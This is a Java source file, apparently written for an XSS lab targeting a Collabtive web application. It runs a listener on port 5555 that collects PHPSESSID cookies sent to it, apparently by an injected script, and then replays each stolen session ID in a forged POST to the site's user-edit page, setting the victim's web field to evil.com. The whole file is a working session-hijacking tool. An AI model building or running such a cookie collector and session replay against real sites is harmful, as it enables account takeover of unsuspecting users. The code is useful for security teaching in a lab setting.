package jono;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class WebListener {
   public static void main(String[] args) throws Exception {
      ServerSocket server = new ServerSocket(5555);
      while (true) {
         Socket s = server.accept();
         System.out.println("Client Accepted");
         Scanner scanner = new Scanner(s.getInputStream());
         while (scanner.hasNext()) {
            String line = scanner.nextLine();
            if (line.contains("PHPSESSID%3D")) {
               String endOfLine = line.split("PHPSESSID%3D")[1];
               String sessionID = endOfLine.split(" ")[0];
               System.out.println("Found session id: " + sessionID);
               setEmail(sessionID);
            }
         }
         scanner.close();
      }
   }
   
   public static void setEmail(String sessionID) throws Exception {
      CloseableHttpClient httpClient = HttpClients.createDefault();
      
      System.out.println("Editing");
      HttpPost httpPost = new HttpPost("http://www.xsslabcollabtive.com/Collabtive/manageuser.php?action=edit");
      httpPost.setHeader("Cookie", "PHPSESSID=" + sessionID);
      httpPost.setHeader("Content-Type","multipart/form-data; boundary=---------------------------23163161301942");
      
      httpPost.setEntity(new StringEntity("-----------------------------23163161301942\nContent-Disposition: form-data; name=\"web\"\n\nevil.com"));
      
      CloseableHttpResponse response2 = httpClient.execute(httpPost);
      response2.close();
   }
}
